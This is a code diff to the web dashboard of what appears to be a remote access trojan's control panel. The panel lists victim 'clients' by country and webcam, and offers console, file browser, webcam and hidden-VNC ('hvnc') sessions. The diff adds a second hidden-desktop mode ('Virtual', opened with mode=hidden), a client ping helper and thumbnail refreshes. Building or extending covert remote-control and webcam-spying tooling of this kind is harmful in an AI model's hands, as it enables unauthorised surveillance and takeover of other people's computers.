@@ -8,6 +8,7 @@ import {
   renderCachedClients,
   startAutoRefresh,
   sendCommand,
+  pingClientNow,
   requestPreview,
   requestThumbnail,
   markManualDisconnect,
@@ -441,6 +442,9 @@ function applyMenuSupportRules(clientId) {
   const hvncBtn = menu.querySelector('[data-open="Backstage"]');
   setAvailability(hvncBtn, isOnline && isWindows, isOnline ? "Backstage is only supported on Windows clients." : "Client is offline");
 
+  const hiddenBtn = menu.querySelector('[data-open="Virtual"]');
+  setAvailability(hiddenBtn, isOnline && isWindows, isOnline ? "Virtual mode is only supported on Windows clients." : "Client is offline");
+
   const webcamBtn = menu.querySelector('[data-open="webcam"]');
   setAvailability(webcamBtn, isOnline && isWindows, isOnline ? "Webcam viewer is only supported on Windows clients." : "Client is offline");
 
@@ -497,6 +501,7 @@ const MENU_OPEN_TO_FEATURE = {
   console: "console",
   remotedesktop: "remote_desktop",
   Backstage: "hvnc",
+  Hidden: "hvnc",
   webcam: "webcam",
   files: "file_browser",
   processes: "processes",
@@ -1033,6 +1038,15 @@ document.querySelectorAll(".dashboard-menu").forEach((details) => {
 
 let dashboardThumbnailLoader = null;
 
+function refreshDashboardThumbnail(clientId) {
+  if (dashboardThumbnailLoader?.refreshNow(clientId)) {
+    return;
+  }
+  // The loader initializes asynchronously; preserve manual refreshes made
+  // before it is ready.
+  requestThumbnail(clientId);
+}
+
 async function isDashboardThumbnailEnabled() {
   try {
     const res = await fetch("/api/settings/thumbnails", { credentials: "include" });
@@ -1106,8 +1120,8 @@ function initializeRenderer() {
     },
     openModal,
     requestPreview,
-    requestThumbnail,
-    pingClient: (id) => sendCommand(id, "ping"),
+    requestThumbnail: refreshDashboardThumbnail,
+    pingClient: pingClientNow,
     onOpenWebcam: (id) => window.open(`/viewer?clientId=${encodeURIComponent(id)}&mode=webcam`, "_blank", "noopener"),
     onMacPermissionRequest: (id, _card, permissionKey) => requestMacPermissions(id, permissionKey),
     onMacPermissionRefresh: (id) => requestMacPermissions(id, "", { refreshOnly: true }),
@@ -1121,6 +1135,9 @@ function initializeRenderer() {
   registerRenderer((data, options) => {
     renderMerge(data, options);
     if (onlineAsciiStatus) onlineAsciiStatus.textContent = String(Number(data?.online) || 0).padStart(3, "0");
+    if (isUnfilteredClientView()) {
+      updateDashboardStatsFromClients(data);
+    }
     if (!options?.fromPluginDashboard) {
       refreshDashboardPluginContributions(data?.items || []);
     }
@@ -1149,6 +1166,15 @@ function initializeRenderer() {
         "-=350",
       );
   }
+}
+
+function isUnfilteredClientView() {
+  return !state.searchTerm &&
+    (state.filterStatus || "all") === "all" &&
+    (state.filterOs || "all") === "all" &&
+    (state.filterCountry || "all") === "all" &&
+    (state.filterGroup || "all") === "all" &&
+    (state.filterWebcam || "all") === "all";
 }
 
 if (logoutBtn && !logoutBtn.dataset.boundLogout) {
@@ -2042,6 +2068,13 @@ menu.addEventListener("click", async (e) => {
   }
   if (open === "Backstage") {
     window.open(`/hvnc?clientId=${contextCard}`, "_blank", "noopener");
+    closeMenu(clearContext);
+    return;
+  }
+  if (open === "Virtual") {
+    // mode=hidden is understood by older hvnc.js builds; current builds treat
+    // it as the virtual-monitor mode compatibility alias.
+    window.open(`/hvnc?clientId=${contextCard}&mode=hidden`, "_blank", "noopener");
     closeMenu(clearContext);
     return;
   }
